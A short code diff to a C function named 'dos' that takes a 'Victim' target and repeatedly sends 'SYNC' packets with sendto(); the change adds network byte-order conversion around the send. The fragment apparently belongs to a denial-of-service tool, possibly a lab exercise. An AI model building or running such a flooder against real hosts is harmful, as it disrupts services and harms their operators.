@@ -6,7 +6,8 @@
 
 
 int dos(struct Victim target, int N) {
-    int protocol, connect_fd, number_of_syncs = 0;
+    int connect_fd, number_of_syncs = 0;
+    uint32_t protocol;
     ssize_t bytes_sent;
     struct sockaddr_in server_addr;
     socklen_t addr_len;
@@ -50,6 +51,7 @@ int dos(struct Victim target, int N) {
             }
         }
 
+        protocol = htonl(protocol);
         //Send SYNC
         bytes_sent = sendto(connect_fd, (void *) &protocol, sizeof(protocol), 0,
                             (struct sockaddr *) &server_addr,
@@ -58,6 +60,7 @@ int dos(struct Victim target, int N) {
             fprintf(stderr, "Unable to send bytes errno: %d\n", errno);
             return -1;
         }
+        protocol = ntohl(protocol);
         // Sleep a bit
         usleep(50000);
         // Throw the socket away
